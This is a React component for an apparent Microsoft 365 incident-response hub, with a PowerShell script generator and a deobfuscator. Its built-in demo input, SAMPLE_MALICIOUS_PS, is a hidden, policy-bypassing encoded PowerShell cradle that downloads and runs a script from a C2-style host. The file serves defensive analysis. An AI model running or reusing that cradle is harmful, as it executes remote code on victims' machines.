'use client';

import React, { useState, useMemo } from 'react';
import {
  Terminal,
  ShieldAlert,
  Sliders,
  Copy,
  Check,
  Download,
  FolderPlus,
  Play,
  RotateCcw,
  Sparkles,
  FileCode,
  Shield,
  Layers,
  Search,
  AlertTriangle,
  FileText,
  Key,
  Globe,
  Radio,
} from 'lucide-react';
import { SCRIPT_TEMPLATES, PowerShellScriptTemplate } from './script-catalog';
import { deobfuscatePowerShell, DeobfuscationResult } from './deobfuscator';
import { useCase } from '@/components/shared/CaseContext';

const SAMPLE_MALICIOUS_PS = `powershell.exe -w hidden -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AZABvAHcAbgBsAG8AYQBkAGUAcgAuAHQAbwBwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=`;

export function TenantPowerShellHub() {
  const [activeMode, setActiveMode] = useState<'generator' | 'deobfuscator'>('generator');

  // Script Generator State
  const [selectedTemplateId, setSelectedTemplateId] = useState<string>(SCRIPT_TEMPLATES[0].id);
  const [paramValues, setParamValues] = useState<Record<string, any>>({});
  const [copiedScript, setCopiedScript] = useState(false);
  const [addedToCase, setAddedToCase] = useState(false);

  // Deobfuscator State
  const [suspiciousScript, setSuspiciousScript] = useState(SAMPLE_MALICIOUS_PS);
  const [deobResult, setDeobResult] = useState<DeobfuscationResult | null>(null);
  const [copiedDeob, setCopiedDeob] = useState(false);

  const { addItem } = useCase();

  // Selected Template
  const activeTemplate = useMemo(() => {
    return SCRIPT_TEMPLATES.find(t => t.id === selectedTemplateId) || SCRIPT_TEMPLATES[0];
  }, [selectedTemplateId]);

  // Current Parameters
  const currentParams = useMemo(() => {
    const res: Record<string, any> = {};
    activeTemplate.parameters.forEach(p => {
      res[p.id] = paramValues[p.id] !== undefined ? paramValues[p.id] : p.defaultValue;
    });
    return res;
  }, [activeTemplate, paramValues]);

  // Generated Script Code
  const generatedCode = useMemo(() => {
    return activeTemplate.generateCode(currentParams);
  }, [activeTemplate, currentParams]);

  const handleParamChange = (paramId: string, val: any) => {
    setParamValues(prev => ({ ...prev, [paramId]: val }));
  };

  const handleCopyScript = () => {
    navigator.clipboard.writeText(generatedCode);
    setCopiedScript(true);
    setTimeout(() => setCopiedScript(false), 2000);
  };

  const handleDownloadScript = () => {
    const blob = new Blob([generatedCode], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${activeTemplate.id}-${new Date().toISOString().split('T')[0]}.ps1`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleAddToCase = () => {
    if (activeMode === 'generator') {
      addItem({
        tool: 'Tenant PowerShell Hub',
        title: `PowerShell Script: ${activeTemplate.title}`,
        category: 'THREAT',
        severity: 'INFO',
        summary: `Generated M365 PowerShell script for '${activeTemplate.title}' with target parameters.`,
        details: {
          template: activeTemplate.title,
          category: activeTemplate.category,
          parameters: currentParams,
          codePreview: generatedCode.substring(0, 400) + '...',
        },
      });
    } else if (deobResult) {
      addItem({
        tool: 'PowerShell Deobfuscator',
        title: `Analyzed PowerShell Payload: ${deobResult.threatSeverity === 'NO_INDICATORS' ? 'No Known Indicators' : `${deobResult.threatSeverity} Risk`}`,
        category: 'THREAT',
        severity: deobResult.threatSeverity === 'NO_INDICATORS' ? 'INFO' : deobResult.threatSeverity,
        summary: `Detected ${deobResult.detectedIndicators.length} threat indicators and ${deobResult.extractedIocs.urls.length} remote URLs.`,
        details: {
          severity: deobResult.threatSeverity,
          indicators: deobResult.detectedIndicators,
          iocs: deobResult.extractedIocs,
          decodedPayloads: deobResult.decodedBase64Payloads,
        },
      });
    }
    setAddedToCase(true);
    setTimeout(() => setAddedToCase(false), 2000);
  };

  const handleRunDeobfuscate = () => {
    const res = deobfuscatePowerShell(suspiciousScript);
    setDeobResult(res);
  };

  const handleCopyDeob = () => {
    if (!deobResult) return;
    navigator.clipboard.writeText(deobResult.deobfuscatedScript);
    setCopiedDeob(true);
    setTimeout(() => setCopiedDeob(false), 2000);
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      {/* Header Banner */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-5 rounded-2xl bg-slate-900/60 border border-slate-800 shadow-xl shadow-black/40">
        <div className="flex items-center space-x-3.5">
          <div className="p-3 rounded-xl bg-blue-500/20 border border-blue-500/40 text-blue-400 shadow-md">
            <Terminal className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center space-x-2">
              <h1 className="text-lg font-bold text-slate-100">
                M365 Tenant PowerShell & Security Hub
              </h1>
            </div>
            <p className="text-xs text-slate-400">
              Interactive tenant incident response scripts, rogue inbox forwarders hunter & PowerShell payload deobfuscator
            </p>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <button
            onClick={handleAddToCase}
            className="flex items-center space-x-1.5 px-3.5 py-2 text-xs font-semibold rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white shadow-lg transition-all"
          >
            {addedToCase ? <Check className="w-3.5 h-3.5 text-emerald-300" /> : <FolderPlus className="w-3.5 h-3.5" />}
            <span>{addedToCase ? 'Added to Case!' : 'Add to Investigation'}</span>
          </button>
        </div>
      </div>

      {/* Mode Switcher Tabs */}
      <div className="flex items-center justify-between border-b border-slate-800 pb-2">
        <div className="flex items-center space-x-2">
          <button
            onClick={() => setActiveMode('generator')}
            className={`px-4 py-2 text-xs font-bold rounded-xl transition-all flex items-center space-x-2 ${
              activeMode === 'generator'
                ? 'bg-violet-600 text-white shadow-md'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
            }`}
          >
            <FileCode className="w-4 h-4" />
            <span>Tenant Script Generator (Parameterized)</span>
          </button>

          <button
            onClick={() => {
              setActiveMode('deobfuscator');
              if (!deobResult) handleRunDeobfuscate();
            }}
            className={`px-4 py-2 text-xs font-bold rounded-xl transition-all flex items-center space-x-2 ${
              activeMode === 'deobfuscator'
                ? 'bg-violet-600 text-white shadow-md'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
            }`}
          >
            <ShieldAlert className="w-4 h-4" />
            <span>PowerShell Deobfuscator & Inspector</span>
          </button>
        </div>
      </div>

      {/* ========================================================================= */}
      {/* MODE A: PARAMETERIZED SCRIPT GENERATOR */}
      {/* ========================================================================= */}
      {activeMode === 'generator' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
          {/* Left Column: Script Selector & Parameters */}
          <div className="space-y-4 lg:col-span-1">
            {/* Catalog Selector */}
            <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
              <label className="text-xs font-bold text-slate-300 block">Select Script Template:</label>
              <div className="space-y-1.5">
                {SCRIPT_TEMPLATES.map(tmpl => {
                  const isSelected = tmpl.id === activeTemplate.id;
                  return (
                    <button
                      key={tmpl.id}
                      onClick={() => {
                        setSelectedTemplateId(tmpl.id);
                        setParamValues({});
                      }}
                      className={`w-full text-left p-2.5 rounded-lg text-xs transition-all flex flex-col space-y-1 ${
                        isSelected
                          ? 'bg-violet-600/20 border border-blue-500/60 text-blue-200 shadow-sm'
                          : 'bg-black/30 hover:bg-slate-800/60 border border-slate-800 text-slate-400'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-slate-200">{tmpl.title}</span>
                      </div>
                      <span className="text-[10px] text-slate-500 uppercase tracking-wider">
                        {tmpl.category}
                      </span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Dynamic Parameter Customizer */}
            <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
              <div className="flex items-center space-x-2 text-xs font-bold text-slate-200">
                <Sliders className="w-4 h-4 text-blue-400" />
                <span>Script Parameters</span>
              </div>
              <p className="text-[11px] text-slate-400">
                Customize values below to update the script code in real time.
              </p>

              <div className="space-y-3 pt-1">
                {activeTemplate.parameters.map(param => (
                  <div key={param.id} className="space-y-1 text-xs">
                    <label className="font-semibold text-slate-300 block">{param.label}</label>
                    <p className="text-[10px] text-slate-500">{param.description}</p>

                    {param.type === 'text' && (
                      <input
                        type="text"
                        value={currentParams[param.id]}
                        onChange={e => handleParamChange(param.id, e.target.value)}
                        placeholder={param.placeholder}
                        className="w-full px-3 py-1.5 bg-black/50 border border-slate-700 rounded-lg text-slate-200 font-mono text-xs focus:outline-none focus:border-blue-500"
                      />
                    )}

                    {param.type === 'number' && (
                      <input
                        type="number"
                        value={currentParams[param.id]}
                        onChange={e => handleParamChange(param.id, Number(e.target.value))}
                        className="w-full px-3 py-1.5 bg-black/50 border border-slate-700 rounded-lg text-slate-200 font-mono text-xs focus:outline-none focus:border-blue-500"
                      />
                    )}

                    {param.type === 'boolean' && (
                      <label className="flex items-center space-x-2 pt-1 text-slate-300 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={currentParams[param.id]}
                          onChange={e => handleParamChange(param.id, e.target.checked)}
                          className="rounded bg-black border-slate-700 text-blue-600 focus:ring-0"
                        />
                        <span className="text-xs font-medium">Enable Option</span>
                      </label>
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Prerequisites & Required Scopes */}
            <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2 text-xs">
              <div className="text-[11px] font-bold text-slate-300">Prerequisites & Modules:</div>
              <div className="flex flex-wrap gap-1">
                {activeTemplate.prerequisites.map(m => (
                  <span key={m} className="px-2 py-0.5 rounded bg-black/40 border border-slate-800 text-[10px] font-mono text-blue-300">
                    {m}
                  </span>
                ))}
              </div>
              <div className="text-[11px] font-bold text-slate-300 pt-1">Required Permissions / Scopes:</div>
              <div className="flex flex-wrap gap-1">
                {activeTemplate.requiredScopes.map(s => (
                  <span key={s} className="px-2 py-0.5 rounded bg-black/40 border border-slate-800 text-[10px] font-mono text-purple-300">
                    {s}
                  </span>
                ))}
              </div>
            </div>
          </div>

          {/* Right Column: Generated Code Viewer */}
          <div className="space-y-3 lg:col-span-2">
            <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 flex items-center justify-between">
              <div>
                <h3 className="text-sm font-bold text-slate-200">{activeTemplate.title}</h3>
                <p className="text-xs text-slate-400">{activeTemplate.description}</p>
              </div>

              <div className="flex items-center space-x-2">
                <button
                  onClick={handleCopyScript}
                  className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-lg border border-slate-700 flex items-center space-x-1.5 transition-colors"
                >
                  {copiedScript ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedScript ? 'Copied Script!' : 'Copy Script'}</span>
                </button>
                <button
                  onClick={handleDownloadScript}
                  className="px-3.5 py-1.5 bg-violet-600 hover:bg-violet-500 text-white text-xs font-semibold rounded-lg flex items-center space-x-1.5 shadow-md transition-all"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download .PS1</span>
                </button>
              </div>
            </div>

            {/* Code Display Area */}
            <div className="relative">
              <pre className="p-4 bg-[var(--bg-app)] border border-slate-800 rounded-xl font-mono text-xs text-blue-200 overflow-x-auto max-h-[600px] leading-relaxed select-all">
                {generatedCode}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODE B: POWERSHELL DEOBFUSCATOR & INSPECTOR */}
      {/* ========================================================================= */}
      {activeMode === 'deobfuscator' && (
        <div className="space-y-5">
          {/* Input Box */}
          <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-3">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <span className="text-xs font-bold text-slate-200">
                Paste Suspicious PowerShell Script or Encoded Command:
              </span>
              <div className="flex items-center space-x-2">
                <button
                  onClick={() => {
                    setSuspiciousScript(SAMPLE_MALICIOUS_PS);
                    handleRunDeobfuscate();
                  }}
                  className="px-2.5 py-1 text-xs bg-red-950/60 hover:bg-red-900/60 border border-red-700/50 text-red-300 rounded-lg font-semibold"
                >
                  Load Sample Malware Payload
                </button>
                <button
                  onClick={() => setSuspiciousScript('')}
                  className="text-xs text-slate-400 hover:text-rose-400"
                >
                  Clear
                </button>
              </div>
            </div>

            <textarea
              value={suspiciousScript}
              onChange={e => setSuspiciousScript(e.target.value)}
              placeholder="Paste powershell.exe -enc SQBFAFgA... or obfuscated PowerShell command..."
              className="w-full h-32 p-3 bg-black/60 border border-slate-800 rounded-xl font-mono text-xs text-slate-200 focus:outline-none focus:border-blue-500 resize-none"
            />

            <div className="flex justify-end">
              <button
                onClick={handleRunDeobfuscate}
                className="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white text-xs font-bold rounded-xl flex items-center space-x-1.5 shadow-md"
              >
                <Sparkles className="w-4 h-4" />
                <span>Deobfuscate & Analyze Payload</span>
              </button>
            </div>
          </div>

          {/* Analysis Results */}
          {deobResult && (
            <div className="space-y-4">
              {/* Verdict Banner */}
              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div className="flex items-center space-x-3">
                  <div className="p-2.5 rounded-lg bg-red-500/20 text-red-400 border border-red-500/40">
                    <ShieldAlert className="w-5 h-5" />
                  </div>
                  <div>
                    <div className="flex items-center space-x-2">
                      <span className="text-xs font-bold text-slate-300">Security Assessment:</span>
                      <span
                        className={`px-2 py-0.5 text-xs font-bold rounded ${
                          deobResult.threatSeverity === 'CRITICAL'
                            ? 'bg-rose-950 border border-rose-500 text-rose-300'
                            : deobResult.threatSeverity === 'HIGH'
                            ? 'bg-orange-950 border border-orange-500 text-orange-300'
                            : deobResult.threatSeverity === 'MEDIUM'
                            ? 'bg-amber-950 border border-amber-500 text-amber-300'
                            : 'bg-slate-800 border border-slate-600 text-slate-300'
                        }`}
                      >
                        {deobResult.threatSeverity === 'NO_INDICATORS' ? 'NO KNOWN INDICATORS' : `${deobResult.threatSeverity} RISK`}
                      </span>
                    </div>
                    <p className="text-xs text-slate-400">
                      Identified {deobResult.detectedIndicators.length} threat indicators and {deobResult.extractedIocs.urls.length} remote URLs.
                      {deobResult.threatSeverity === 'NO_INDICATORS' && ' This does not prove the script is safe.'}
                    </p>
                  </div>
                </div>

                <button
                  onClick={handleCopyDeob}
                  className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-lg border border-slate-700 flex items-center space-x-1.5"
                >
                  {copiedDeob ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedDeob ? 'Copied Clean Code!' : 'Copy Deobfuscated'}</span>
                </button>
              </div>

              {/* Threat Indicators Cards */}
              {deobResult.detectedIndicators.length > 0 && (
                <div className="space-y-2">
                  <span className="text-xs font-bold text-slate-300">Detected Threat Behaviors & Evasions:</span>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
                    {deobResult.detectedIndicators.map((ind, idx) => (
                      <div
                        key={idx}
                        className="p-3 rounded-lg bg-rose-950/20 border border-rose-900/40 space-y-1 text-xs"
                      >
                        <div className="flex items-center justify-between font-bold text-rose-300">
                          <span>⚠️ {ind.title}</span>
                          <span className="text-[10px] px-1.5 py-0.2 rounded bg-rose-950 border border-rose-800 text-rose-400 font-mono">
                            {ind.severity}
                          </span>
                        </div>
                        <p className="text-slate-400 text-[11px]">{ind.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Extracted IOCs */}
              {(deobResult.extractedIocs.urls.length > 0 || deobResult.extractedIocs.ips.length > 0) && (
                <div className="p-3.5 rounded-xl bg-black/40 border border-slate-800 space-y-2 text-xs">
                  <span className="font-bold text-cyan-400">Extracted Network Indicators (IOCs):</span>
                  <div className="space-y-1 font-mono text-slate-300">
                    {deobResult.extractedIocs.urls.map((u, i) => (
                      <div key={i} className="text-amber-300 bg-black/50 p-1.5 rounded border border-slate-800 break-all">
                        URL: {u}
                      </div>
                    ))}
                    {deobResult.extractedIocs.ips.map((ip, i) => (
                      <div key={i} className="text-purple-300 bg-black/50 p-1.5 rounded border border-slate-800">
                        IP: {ip}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Clean Deobfuscated Output */}
              <div className="space-y-1.5">
                <span className="text-xs font-bold text-slate-300">Clean Deobfuscated Script:</span>
                <pre className="p-4 bg-[var(--bg-app)] border border-slate-800 rounded-xl font-mono text-xs text-emerald-300 overflow-x-auto max-h-80 leading-relaxed select-all">
                  {deobResult.deobfuscatedScript}
                </pre>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
